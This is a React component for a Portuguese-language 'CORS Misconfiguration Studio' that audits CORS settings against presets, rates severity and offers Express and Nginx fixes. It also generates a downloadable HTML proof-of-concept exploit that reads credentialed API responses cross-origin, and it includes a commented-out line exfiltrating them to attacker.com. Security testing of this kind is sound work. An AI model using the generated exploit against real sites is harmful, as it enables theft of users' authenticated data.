import React, { useState, useMemo } from 'react';
import { 
  Globe, 
  ShieldAlert, 
  ShieldCheck, 
  AlertTriangle, 
  Copy, 
  Check, 
  Download, 
  Code2, 
  ExternalLink, 
  Terminal, 
  Sparkles, 
  Info,
  CheckCircle2,
  Lock,
  Unlock,
  Layers,
  FileCode,
  ArrowRight,
  Server
} from 'lucide-react';

interface CorsPreset {
  id: string;
  name: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'SECURE';
  description: string;
  targetUrl: string;
  allowedOriginHeader: string;
  allowCredentials: boolean;
  allowedMethods: string;
  allowedHeaders: string;
  testOrigin: string;
  exploitScenario: string;
  impact: string;
}

const CORS_PRESETS: CorsPreset[] = [
  {
    id: 'origin-reflection-credentials',
    name: 'Reflexão Arbitrária de Origin com Credenciais (ACAC: true)',
    severity: 'CRITICAL',
    description: 'O servidor reflete cegamente o cabeçalho Origin da requisição e inclui Access-Control-Allow-Credentials: true. Qualquer site malicioso pode ler dados privados autenticados (PII, tokens, sessões).',
    targetUrl: 'https://api.finpay-global.com/v1/user/sensitive-profile',
    allowedOriginHeader: 'https://evil-attacker.com',
    allowCredentials: true,
    allowedMethods: 'GET, POST, OPTIONS',
    allowedHeaders: 'Content-Type, Authorization',
    testOrigin: 'https://evil-attacker.com',
    exploitScenario: 'A vítima autenticada visita evil-attacker.com. Um script JavaScript envia requisição fetch() com credentials: "include". O navegador permite a leitura completa da resposta JSON contendo dados bancários e PII.',
    impact: 'Vazamento total de dados autenticados e roubo de sessão de usuários logados.'
  },
  {
    id: 'null-origin-trusted',
    name: 'Confiança na Origin "null" (Bypass via Sandboxed Iframe)',
    severity: 'HIGH',
    description: 'O servidor possui uma lista branca mal configurada que aceita Origin: null (frequentemente adicionado para suportar arquivos locais file:// ou redirects).',
    targetUrl: 'https://auth.cloudmetrics.io/api/v2/session-tokens',
    allowedOriginHeader: 'null',
    allowCredentials: true,
    allowedMethods: 'GET, POST',
    allowedHeaders: 'Content-Type',
    testOrigin: 'null',
    exploitScenario: 'O atacante hospeda um iframe com sandbox="allow-scripts" (sem allow-same-origin). Requisições disparadas de dentro do iframe geram cabeçalho "Origin: null", contornando restrições de CORS.',
    impact: 'Roubo de tokens de sessão emitidos em endpoints sensíveis.'
  },
  {
    id: 'regex-unescaped-dot',
    name: 'Regex com Ponto Não Escapado (target.com vs targetXcom.com)',
    severity: 'HIGH',
    description: 'Validação de regex insegura no backend (ex: /target\\.com/ ou /target.com/) sem escapar o ponto ou sem âncoras ^ e $. Permite registrar domínios como target-attacker.com ou targetXcom.com.',
    targetUrl: 'https://api.finpay-global.com/v1/accounts/summary',
    allowedOriginHeader: 'https://finpayXglobal.com',
    allowCredentials: true,
    allowedMethods: 'GET, POST',
    allowedHeaders: 'Content-Type, X-CSRF-Token',
    testOrigin: 'https://finpayXglobal.com',
    exploitScenario: 'O atacante registra o domínio finpayXglobal.com ou finpay-global.com.attacker.com. O backend considera a origin válida e emite cabeçalhos CORS permissivos.',
    impact: 'Bypass completo de whitelisting de domínio perimetral.'
  },
  {
    id: 'subdomain-trust-takeover',
    name: 'Confiança Cega em Todos os Subdomínios (*.target.com)',
    severity: 'MEDIUM',
    description: 'O backend permite qualquer subdomínio de target.com. Se qualquer subdomínio estiver vulnerável a XSS ou Subdomain Takeover (CNAME órfão), o CORS pode ser explorado através dele.',
    targetUrl: 'https://internal-billing.finpay.com/api/invoices',
    allowedOriginHeader: 'https://orphaned-blog.finpay.com',
    allowCredentials: true,
    allowedMethods: 'GET, POST',
    allowedHeaders: 'Content-Type',
    testOrigin: 'https://orphaned-blog.finpay.com',
    exploitScenario: 'O atacante assume o subdomínio órfão (takeover) ou explora um XSS persistente no blog. A partir dali, dispara requisições autenticadas para o endpoint crítico.',
    impact: 'Pivotagem de vulnerabilidades em subdomínios periféricos para sistemas centrais.'
  },
  {
    id: 'wildcard-public-api',
    name: 'Wildcard Público (ACAO: *) Sem Credenciais',
    severity: 'LOW',
    description: 'Uso de Access-Control-Allow-Origin: * em APIs públicas. O navegador proíbe credenciais com wildcard, tornando seguro se o endpoint for puramente público.',
    targetUrl: 'https://public-cdn.cloudmetrics.io/v1/system-status',
    allowedOriginHeader: '*',
    allowCredentials: false,
    allowedMethods: 'GET, HEAD',
    allowedHeaders: '*',
    testOrigin: 'https://any-website.org',
    exploitScenario: 'Qualquer site pode ler a resposta pública. Não há risco para dados privados, mas pode ser vulnerável se o endpoint expuser métricas internas da arquitetura.',
    impact: 'Divulgação de informações públicas ou métricas operacionais.'
  },
  {
    id: 'secure-whitelist',
    name: 'Configuração Segura (Whitelist Rígida + Validação Estrita)',
    severity: 'SECURE',
    description: 'Validação exata em lista de origens corporativas autorizadas sem suporte a wildcards ou reflexão cega. Rejeita Origins não reconhecidas sem emitir headers ACAO.',
    targetUrl: 'https://api.finpay-global.com/v1/vault/secure-transfer',
    allowedOriginHeader: 'https://portal.finpay-global.com',
    allowCredentials: true,
    allowedMethods: 'GET, POST',
    allowedHeaders: 'Content-Type, Authorization, X-Requested-With',
    testOrigin: 'https://portal.finpay-global.com',
    exploitScenario: 'Requisições de origens externas não autorizadas não recebem cabeçalhos CORS, e o navegador bloqueia qualquer leitura de resposta no cliente.',
    impact: 'Nenhum. Arquitetura em conformidade com as melhores práticas de AppSec.'
  }
];

export const CorsStudio: React.FC = () => {
  const [selectedPresetId, setSelectedPresetId] = useState<string>(CORS_PRESETS[0].id);
  const [targetUrl, setTargetUrl] = useState<string>(CORS_PRESETS[0].targetUrl);
  const [testOrigin, setTestOrigin] = useState<string>(CORS_PRESETS[0].testOrigin);
  const [allowCredentials, setAllowCredentials] = useState<boolean>(CORS_PRESETS[0].allowCredentials);
  const [allowedMethods, setAllowedMethods] = useState<string>(CORS_PRESETS[0].allowedMethods);
  const [allowedHeaders, setAllowedHeaders] = useState<string>(CORS_PRESETS[0].allowedHeaders);
  const [customOriginHeader, setCustomOriginHeader] = useState<string>(CORS_PRESETS[0].allowedOriginHeader);
  const [copiedSection, setCopiedSection] = useState<string | null>(null);

  const applyPreset = (preset: CorsPreset) => {
    setSelectedPresetId(preset.id);
    setTargetUrl(preset.targetUrl);
    setTestOrigin(preset.testOrigin);
    setAllowCredentials(preset.allowCredentials);
    setAllowedMethods(preset.allowedMethods);
    setAllowedHeaders(preset.allowedHeaders);
    setCustomOriginHeader(preset.allowedOriginHeader);
  };

  // Evaluation logic
  const analysis = useMemo(() => {
    const isWildcard = customOriginHeader === '*';
    const isNullOrigin = testOrigin.toLowerCase() === 'null' || customOriginHeader === 'null';
    const isReflected = customOriginHeader.trim() === testOrigin.trim() && testOrigin.trim() !== '';
    const hasCredentials = allowCredentials;

    let severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'SECURE' = 'SECURE';
    let verdictTitle = 'Configuração Segura';
    let verdictSummary = 'A política CORS não apresenta vulnerabilidades identificáveis para a origem testada.';
    let browserReadable = false;

    if (isWildcard && hasCredentials) {
      // Browser spec blocks wildcard + credentials
      severity = 'LOW';
      verdictTitle = 'Inconsistência Bloqueada pelo Navegador';
      verdictSummary = 'O servidor retornou ACAO: * com ACAC: true. A especificação W3C / WHATWG proíbe explicitamente essa combinação e o navegador bloqueará o acesso aos dados.';
      browserReadable = false;
    } else if (isReflected && hasCredentials && !isWildcard) {
      if (isNullOrigin) {
        severity = 'HIGH';
        verdictTitle = 'Vulnerabilidade Alta: Origem "null" Permitida com Credenciais';
        verdictSummary = 'O servidor aceita a origem "null" e suporta credenciais. Um atacante pode explorar usando um iframe com sandbox="allow-scripts".';
        browserReadable = true;
      } else {
        severity = 'CRITICAL';
        verdictTitle = 'Vulnerabilidade Crítica: Reflexão Arbitrária de Origin com Credenciais';
        verdictSummary = 'O servidor reflete a origem do atacante com credenciais habilitadas (ACAC: true). O navegador concederá ao script do atacante leitura completa das respostas HTTP autenticadas.';
        browserReadable = true;
      }
    } else if (isReflected && !hasCredentials && !isWildcard) {
      severity = 'MEDIUM';
      verdictTitle = 'Reflexão de Origin sem Credenciais';
      verdictSummary = 'O servidor reflete qualquer origem, porém sem credenciais. Pode haver vazamento de dados se a API autenticar via IP corporativo ou cabeçalhos de rede sem cookies/Authorization.';
      browserReadable = true;
    } else if (isNullOrigin && hasCredentials) {
      severity = 'HIGH';
      verdictTitle = 'Vulnerabilidade Alta: Origem "null" Confiada';
      verdictSummary = 'A origem "null" é aceita com suporte a credenciais. Bypass possível por meio de iframes sandboxed ou redirecionamentos locais.';
      browserReadable = true;
    } else if (isWildcard && !hasCredentials) {
      severity = 'LOW';
      verdictTitle = 'CORS Público Permissivo (Wildcard Sem Credenciais)';
      verdictSummary = 'Qualquer domínio pode ler respostas deste endpoint. Se o conteúdo for estritamente público, o risco é baixo; caso contrário, há divulgação de dados.';
      browserReadable = true;
    }

    return {
      severity,
      verdictTitle,
      verdictSummary,
      browserReadable,
      isWildcard,
      isNullOrigin,
      isReflected,
      hasCredentials
    };
  }, [customOriginHeader, testOrigin, allowCredentials]);

  // Generate PoC Exploit HTML
  const generatedHtmlPoc = useMemo(() => {
    return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS Misconfiguration PoC — Exploit Demo</title>
  <style>
    body { font-family: monospace; background: #0f172a; color: #f8fafc; padding: 24px; }
    .card { background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 16px; margin-bottom: 16px; }
    button { background: #e11d48; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
    button:hover { background: #be123c; }
    pre { background: #020617; padding: 12px; border-radius: 6px; overflow-x: auto; color: #38bdf8; }
  </style>
</head>
<body>
  <h1>🔥 CORS Misconfiguration PoC Exploit</h1>
  <p>Alvo: <strong>${targetUrl}</strong></p>
  <p>Origem do Atacante: <strong>${testOrigin}</strong></p>
  
  <div class="card">
    <button onclick="triggerExploit()">Executar Exploit de Roubo de Dados</button>
    <h3>Dados Roubados / Resposta Exfiltrada:</h3>
    <pre id="output">Clique no botão para executar o PoC...</pre>
  </div>

  <script>
    function triggerExploit() {
      const output = document.getElementById('output');
      output.innerText = '[*] Enviando requisição autenticada com credentials: "include"...\\n';

      const xhr = new XMLHttpRequest();
      xhr.open('GET', '${targetUrl}', true);
      xhr.withCredentials = ${allowCredentials};
      
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          if (xhr.status >= 200 && xhr.status < 400) {
            output.innerText = '[+] SUCESSO! Dados autenticados lidos pelo atacante (Status ' + xhr.status + '):\\n\\n' + xhr.responseText;
            // Exemplo de exfiltração para o servidor do atacante
            // fetch('https://attacker.com/log?data=' + encodeURIComponent(xhr.responseText));
          } else {
            output.innerText = '[-] Falha na leitura da resposta (Status ' + xhr.status + '). Verifique o console do navegador para erros de CORS.';
          }
        }
      };
      xhr.onerror = function() {
        output.innerText = '[-] Erro na requisição! O navegador bloqueou a leitura devido à política de CORS.';
      };
      xhr.send();
    }
  </script>
</body>
</html>`;
  }, [targetUrl, testOrigin, allowCredentials]);

  // Code remediation snippets
  const expressFix = `// Solução para Express.js (Node.js) com whitelist estrita
import express from 'express';
import cors from 'cors';

const app = express();

const ALLOWED_ORIGINS = [
  'https://portal.empresa.com',
  'https://app.empresa.com'
];

const corsOptions = {
  origin: (origin, callback) => {
    // Permite requisições sem origin (ex: mobile apps nativos ou curl) caso desejado
    if (!origin) return callback(null, true);
    
    if (ALLOWED_ORIGINS.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Bloqueado pela política CORS restrita'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token']
};

app.use(cors(corsOptions));`;

  const nginxFix = `# Solução segura no Nginx usando mapa de origens estritas
map $http_origin $cors_allowed_origin {
    default "";
    "https://portal.empresa.com" "$http_origin";
    "https://app.empresa.com"    "$http_origin";
}

server {
    listen 443 ssl;
    server_name api.empresa.com;

    location /v1/ {
        if ($cors_allowed_origin != "") {
            add_header 'Access-Control-Allow-Origin' $cors_allowed_origin always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS' always;
            add_header 'Access-Control-Allow-Headers' 'Authorization, Content-Type' always;
        }

        if ($request_method = 'OPTIONS') {
            return 204;
        }
        
        proxy_pass http://backend_upstream;
    }
}`;

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedSection(id);
    setTimeout(() => setCopiedSection(null), 2000);
  };

  const downloadHtmlFile = () => {
    const blob = new Blob([generatedHtmlPoc], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cors-exploit-poc-${Date.now()}.html`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-6 relative overflow-hidden">
        <div className="absolute -right-8 -bottom-8 w-60 h-60 bg-rose-500/10 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="space-y-1.5">
            <div className="flex items-center gap-2">
              <span className="px-2.5 py-0.5 rounded-full bg-rose-500/15 border border-rose-500/30 text-rose-400 font-mono text-xs font-bold flex items-center gap-1.5">
                <Globe className="w-3.5 h-3.5" />
                <span>CORS Misconfiguration Studio</span>
              </span>
              <span className="text-zinc-500 text-xs">•</span>
              <span className="text-zinc-400 font-mono text-xs">Origin Reflection & Exploit Builder</span>
            </div>
            <h2 className="text-2xl font-bold text-white tracking-tight flex items-center gap-2">
              Auditoria de CORS & Gerador de Exploit PoC
            </h2>
            <p className="text-xs sm:text-sm text-zinc-400 max-w-3xl leading-relaxed">
              Diagnostique falhas de Cross-Origin Resource Sharing (CORS): reflexão cega de <code className="text-rose-300">Origin</code> com credenciais ativas (<code className="text-rose-300">ACAC: true</code>), confiança indevida na origem <code className="text-amber-300">null</code>, falhas de regex em subdomínios e gere instantaneamente o PoC em HTML reproduzível.
            </p>
          </div>

          <button
            type="button"
            onClick={downloadHtmlFile}
            className="px-4 py-2.5 rounded-xl bg-rose-600 hover:bg-rose-500 text-white font-mono text-xs font-bold flex items-center gap-2 transition-all shadow-lg shadow-rose-900/30 self-start md:self-auto shrink-0"
          >
            <Download className="w-4 h-4" />
            <span>Baixar PoC HTML (.html)</span>
          </button>
        </div>
      </div>

      {/* Preset Scenarios Selector */}
      <div className="space-y-2">
        <label className="text-xs font-mono font-bold text-zinc-400 uppercase tracking-wider flex items-center gap-1.5">
          <Sparkles className="w-3.5 h-3.5 text-rose-400" />
          <span>Cenários de Teste & Presets de Vulnerabilidade:</span>
        </label>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
          {CORS_PRESETS.map(preset => {
            const isSelected = selectedPresetId === preset.id;
            return (
              <button
                key={preset.id}
                type="button"
                onClick={() => applyPreset(preset)}
                className={`text-left p-3.5 rounded-xl border transition-all flex flex-col justify-between gap-2 ${
                  isSelected 
                    ? 'bg-[#181824] border-rose-500 shadow-md shadow-rose-950/20 ring-1 ring-rose-500/30' 
                    : 'bg-[#121218] border-[#22222f] hover:border-zinc-700'
                }`}
              >
                <div className="space-y-1">
                  <div className="flex items-center justify-between gap-2">
                    <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold border ${
                      preset.severity === 'CRITICAL' ? 'bg-red-500/20 text-red-300 border-red-500/30' :
                      preset.severity === 'HIGH' ? 'bg-orange-500/20 text-orange-300 border-orange-500/30' :
                      preset.severity === 'MEDIUM' ? 'bg-amber-500/20 text-amber-300 border-amber-500/30' :
                      preset.severity === 'LOW' ? 'bg-blue-500/20 text-blue-300 border-blue-500/30' :
                      'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
                    }`}>
                      {preset.severity}
                    </span>
                    {preset.allowCredentials && (
                      <span className="text-[10px] font-mono text-rose-400 flex items-center gap-1">
                        <Lock className="w-2.5 h-2.5" /> ACAC: true
                      </span>
                    )}
                  </div>
                  <h4 className="text-xs font-bold text-white line-clamp-1">{preset.name}</h4>
                  <p className="text-[11px] text-zinc-400 line-clamp-2 leading-relaxed">{preset.description}</p>
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Main Interactive Studio Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Parameters & Headers Simulator (7 cols) */}
        <div className="lg:col-span-7 space-y-5">
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-4">
            <h3 className="text-xs font-mono font-bold text-zinc-300 uppercase tracking-wider flex items-center gap-2">
              <Server className="w-4 h-4 text-rose-400" />
              <span>Parâmetros de Teste & Headers Simulados</span>
            </h3>

            {/* Target URL */}
            <div className="space-y-1.5">
              <label className="text-[11px] font-mono font-bold text-zinc-400">Endpoint Alvo (API / Recurso Sensível):</label>
              <input
                type="text"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder="https://api.alvo.com/v1/user/profile"
                className="w-full bg-[#161622] border border-[#262638] rounded-xl px-3.5 py-2 text-xs text-white font-mono focus:outline-none focus:border-rose-500"
              />
            </div>

            {/* Test Origin & Reflected Header */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div className="space-y-1.5">
                <label className="text-[11px] font-mono font-bold text-zinc-400">Origem Enviada na Requisição (<code className="text-rose-300">Origin:</code>):</label>
                <input
                  type="text"
                  value={testOrigin}
                  onChange={(e) => setTestOrigin(e.target.value)}
                  placeholder="https://evil-attacker.com ou null"
                  className="w-full bg-[#161622] border border-[#262638] rounded-xl px-3.5 py-2 text-xs text-white font-mono focus:outline-none focus:border-rose-500"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-[11px] font-mono font-bold text-zinc-400">Resposta do Servidor (<code className="text-emerald-300">Access-Control-Allow-Origin:</code>):</label>
                <input
                  type="text"
                  value={customOriginHeader}
                  onChange={(e) => setCustomOriginHeader(e.target.value)}
                  placeholder="https://evil-attacker.com ou *"
                  className="w-full bg-[#161622] border border-[#262638] rounded-xl px-3.5 py-2 text-xs text-white font-mono focus:outline-none focus:border-rose-500"
                />
              </div>
            </div>

            {/* Credentials & Allowed Methods */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-1">
              <div className="bg-[#161622] p-3.5 rounded-xl border border-[#262638] flex items-center justify-between">
                <div>
                  <div className="text-xs font-bold text-white flex items-center gap-1.5">
                    {allowCredentials ? <Lock className="w-3.5 h-3.5 text-rose-400" /> : <Unlock className="w-3.5 h-3.5 text-zinc-400" />}
                    <span>Allow-Credentials:</span>
                  </div>
                  <div className="text-[10px] font-mono text-zinc-400">Access-Control-Allow-Credentials</div>
                </div>
                <button
                  type="button"
                  onClick={() => setAllowCredentials(!allowCredentials)}
                  className={`px-3 py-1 rounded-lg text-xs font-mono font-bold transition-all ${
                    allowCredentials ? 'bg-rose-500 text-white' : 'bg-[#20202e] text-zinc-400'
                  }`}
                >
                  {allowCredentials ? 'true' : 'false'}
                </button>
              </div>

              <div className="space-y-1">
                <label className="text-[11px] font-mono font-bold text-zinc-400">Métodos Permitidos:</label>
                <input
                  type="text"
                  value={allowedMethods}
                  onChange={(e) => setAllowedMethods(e.target.value)}
                  placeholder="GET, POST, OPTIONS"
                  className="w-full bg-[#161622] border border-[#262638] rounded-xl px-3.5 py-2 text-xs text-white font-mono focus:outline-none focus:border-rose-500"
                />
              </div>
            </div>

            {/* HTTP Headers Preview Box */}
            <div className="space-y-1.5 pt-2">
              <div className="flex items-center justify-between">
                <span className="text-[11px] font-mono font-bold text-zinc-400">Cabeçalhos HTTP da Resposta (Simulado):</span>
                <button
                  type="button"
                  onClick={() => copyToClipboard(`HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: ${customOriginHeader}\nAccess-Control-Allow-Credentials: ${allowCredentials}\nAccess-Control-Allow-Methods: ${allowedMethods}`, 'headers')}
                  className="text-[10px] font-mono text-zinc-400 hover:text-white flex items-center gap-1"
                >
                  {copiedSection === 'headers' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar Headers</span>
                </button>
              </div>
              <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-zinc-300 leading-relaxed overflow-x-auto">
                <span className="text-zinc-500">HTTP/1.1 200 OK</span>{'\n'}
                <span className="text-emerald-400">Access-Control-Allow-Origin:</span> {customOriginHeader}{'\n'}
                <span className="text-rose-400">Access-Control-Allow-Credentials:</span> {allowCredentials ? 'true' : 'false'}{'\n'}
                <span className="text-cyan-400">Access-Control-Allow-Methods:</span> {allowedMethods}{'\n'}
                <span className="text-zinc-500">Content-Type: application/json</span>{'\n'}
                <span className="text-zinc-500">Vary: Origin</span>
              </pre>
            </div>
          </div>

          {/* HTML PoC Code Generator */}
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-mono font-bold text-zinc-300 uppercase tracking-wider flex items-center gap-2">
                <FileCode className="w-4 h-4 text-rose-400" />
                <span>Exploit PoC em HTML Autocontido</span>
              </h3>
              <button
                type="button"
                onClick={() => copyToClipboard(generatedHtmlPoc, 'poc')}
                className="px-2.5 py-1 rounded-lg bg-[#1a1a24] hover:bg-[#252535] text-zinc-300 text-xs font-mono font-bold flex items-center gap-1.5 transition-all border border-[#262638]"
              >
                {copiedSection === 'poc' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>Copiar Exploit</span>
              </button>
            </div>
            <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3.5 text-[11px] font-mono text-zinc-300 max-h-[220px] overflow-y-auto leading-relaxed">
              {generatedHtmlPoc}
            </pre>
          </div>
        </div>

        {/* Right Column: Security Analysis & Verdict (5 cols) */}
        <div className="lg:col-span-5 space-y-5">
          {/* Analysis Card */}
          <div className={`rounded-2xl p-5 border space-y-4 ${
            analysis.severity === 'CRITICAL' ? 'bg-red-950/20 border-red-500/40' :
            analysis.severity === 'HIGH' ? 'bg-orange-950/20 border-orange-500/40' :
            analysis.severity === 'MEDIUM' ? 'bg-amber-950/20 border-amber-500/40' :
            analysis.severity === 'LOW' ? 'bg-blue-950/20 border-blue-500/40' :
            'bg-emerald-950/20 border-emerald-500/40'
          }`}>
            <div className="flex items-start justify-between gap-3">
              <div className="space-y-1">
                <div className="flex items-center gap-2">
                  <span className={`px-2.5 py-0.5 rounded-full text-xs font-mono font-bold border ${
                    analysis.severity === 'CRITICAL' ? 'bg-red-500/30 text-red-300 border-red-500/50' :
                    analysis.severity === 'HIGH' ? 'bg-orange-500/30 text-orange-300 border-orange-500/50' :
                    analysis.severity === 'MEDIUM' ? 'bg-amber-500/30 text-amber-300 border-amber-500/50' :
                    analysis.severity === 'LOW' ? 'bg-blue-500/30 text-blue-300 border-blue-500/50' :
                    'bg-emerald-500/30 text-emerald-300 border-emerald-500/50'
                  }`}>
                    {analysis.severity}
                  </span>
                  <span className="text-xs font-mono text-zinc-400">
                    CVSS Estimado: {analysis.severity === 'CRITICAL' ? '8.8 (High/Critical)' : analysis.severity === 'HIGH' ? '7.5 (High)' : analysis.severity === 'MEDIUM' ? '5.3 (Medium)' : '0.0 (None)'}
                  </span>
                </div>
                <h3 className="text-base font-bold text-white">{analysis.verdictTitle}</h3>
              </div>
            </div>

            <p className="text-xs text-zinc-300 leading-relaxed">
              {analysis.verdictSummary}
            </p>

            {/* Browser Execution Behavior Matrix */}
            <div className="bg-[#12121a] p-3.5 rounded-xl border border-[#20202e] space-y-2 text-xs font-mono">
              <div className="text-[11px] font-bold text-zinc-300 uppercase">Comportamento do Navegador:</div>
              <div className="flex items-center justify-between text-[11px]">
                <span className="text-zinc-400">Leitura de Resposta via JS:</span>
                <span className={analysis.browserReadable ? 'text-red-400 font-bold' : 'text-emerald-400 font-bold'}>
                  {analysis.browserReadable ? 'PERMITIDO (Vulnerável)' : 'BLOQUEADO (Seguro)'}
                </span>
              </div>
              <div className="flex items-center justify-between text-[11px]">
                <span className="text-zinc-400">Envio de Cookies / Auth:</span>
                <span className={analysis.hasCredentials ? 'text-red-400 font-bold' : 'text-zinc-400 font-bold'}>
                  {analysis.hasCredentials ? 'withCredentials: true' : 'withCredentials: false'}
                </span>
              </div>
              <div className="flex items-center justify-between text-[11px]">
                <span className="text-zinc-400">Origem Refletida:</span>
                <span className={analysis.isReflected ? 'text-amber-400 font-bold' : 'text-zinc-400 font-bold'}>
                  {analysis.isReflected ? 'Sim (Dinâmica)' : 'Não (Fixa / Restrita)'}
                </span>
              </div>
            </div>
          </div>

          {/* Hardening & Defense Snippets */}
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-3">
            <h3 className="text-xs font-mono font-bold text-zinc-300 uppercase tracking-wider flex items-center gap-2">
              <ShieldCheck className="w-4 h-4 text-emerald-400" />
              <span>Remediação Recomendada (Whitelist Rígida)</span>
            </h3>

            {/* Express.js snippet */}
            <div className="space-y-1.5">
              <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                <span>Express.js (Node.js):</span>
                <button
                  type="button"
                  onClick={() => copyToClipboard(expressFix, 'express')}
                  className="hover:text-white flex items-center gap-1"
                >
                  {copiedSection === 'express' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[10px] font-mono text-zinc-300 max-h-[140px] overflow-y-auto leading-relaxed">
                {expressFix}
              </pre>
            </div>

            {/* Nginx snippet */}
            <div className="space-y-1.5 pt-1">
              <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                <span>Nginx (Reverse Proxy Map):</span>
                <button
                  type="button"
                  onClick={() => copyToClipboard(nginxFix, 'nginx')}
                  className="hover:text-white flex items-center gap-1"
                >
                  {copiedSection === 'nginx' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[10px] font-mono text-zinc-300 max-h-[140px] overflow-y-auto leading-relaxed">
                {nginxFix}
              </pre>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
